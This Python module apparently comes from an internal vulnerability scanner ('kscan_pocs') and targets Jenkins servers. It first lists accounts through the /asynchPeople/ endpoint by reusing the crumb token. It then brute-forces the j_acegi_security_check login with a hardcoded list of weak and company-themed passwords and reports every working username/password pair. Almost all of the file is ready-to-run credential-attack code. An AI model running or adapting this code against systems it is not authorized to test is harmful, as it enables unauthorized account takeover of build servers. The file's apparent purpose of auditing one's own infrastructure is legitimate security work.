# -*- coding: UTF-8 -*-
'''=================================================
@Project -> File   ：kscan_pocs -> jenkinsCheck
@IDE    ：PyCharm
@Author ：wansuiye
@Date   ：2020/9/25 7:42
@Desc   ：
=================================================='''

import requests
import re
from .utils.getFile import get_var_items, genUserPasswd

passwd_list = ['admin', '1234', '123456', 'toor', 'test', 'demo',
               'work', 'root', 'ksyun', 'ksyun123', 'Ksyun', 'Ksyun123',
               'kingsoft', 'Kingsoft', 'kingsoft123', 'Kingsoft123',
               'Ksyun@123!', 'Ksyun@2019']


def get_dict(flag=1):
    user_list = get_var_items('ssh_user.txt')
    passwd_list = get_var_items('top200passwd.txt')

    return genUserPasswd(user_list, passwd_list)


def get_passwd(flag=1):
    passwd_list = get_var_items('top200passwd.txt')

    return passwd_list


def get_userlist(target, timeout):
    url = '{}://{}:{}'.format(target[0], target[1], int(target[2]))
    user_list = []

    user_index = '/asynchPeople/'

    res1 = requests.get(url=url + user_index, verify=False, timeout=timeout)
    cookies = res1.cookies.get_dict()

    obj1 = re.findall(u'proxy=makeStaplerProxy\((.*?)\);</script>', res1.text)
    if len(obj1) == 0:
        return None
    obj2 = obj1[0].split(',')
    index = obj2[0].strip('\'')
    crumb = obj2[1].strip('\'')

    headers = {
        'X-Prototype-Version': '1.7',
        'Crumb': crumb,
        'Jenkins-Crumb': crumb,
        'X-Requested-With': 'XMLHttpRequest',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.100 Safari/537.36',
        'Content-type': 'application/x-stapler-method-invocation;charset=UTF-8',
        'Origin': url,
        'Referer': url + user_index,
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'zh-CN,zh;q=0.9'
    }

    res2 = requests.post(url=url + index + '/start', data='[]', headers=headers,
                         cookies=cookies, verify=False, timeout=timeout)
    if res2.status_code != 200:
        return None
    res3 = requests.post(url=url + index + '/news', data='[]', headers=headers,
                         cookies=cookies, verify=False, timeout=timeout)
    if res3.status_code != 200:
        return None
    user_data = res3.json()
    for item in user_data['data']:
        if item['id'] != None:
            user_list.append(item['id'])

    return user_list


def bf(target, user, passwd, timeout):
    url = '{}://{}:{}/j_acegi_security_check'.format(target[0], target[1], int(target[2]))
    retVal = ''
    try:
        data = {'j_username': user,
                'j_password': passwd,
                'from': '/',
                'Submit': 'login'
                }
        res = requests.post(url, data=data, verify=False, timeout=timeout)
        if res.status_code == 200:
            retVal = '{}/{}'.format(user, passwd)
    except:
        pass
    return retVal


def check(target, **kwargs):
    timeout = kwargs.get('timeout') or 3
    flag = kwargs.get('flag') or 1
    retVal = {'service': 'jenkins', 'status': 1, 'url': ''}

    url = '{}://{}:{}'.format(target[0], target[1], int(target[2]))

    if requests.get(url, verify=False, timeout=timeout).status_code == 200:
        user_list = get_userlist(target, timeout)
        if user_list:
            user_list.append('admin')
            for user in user_list:
                for passwd in passwd_list:
                    res = bf(target, user, passwd, timeout)
                    if res:
                        retVal['status'] = 2
                        retVal['url'] += res + '\n'
        else:
            user='admin'
            for passwd in passwd_list:
                res = bf(target, user, passwd, timeout)
                if res:
                    retVal['status'] = 2
                    retVal['url'] += res + '\n'
    else:
        user = 'admin'
        for passwd in passwd_list:
            res = bf(target, user, passwd, timeout)
            if res:
                retVal['status'] = 2
                retVal['url'] += res + '\n'

    return retVal
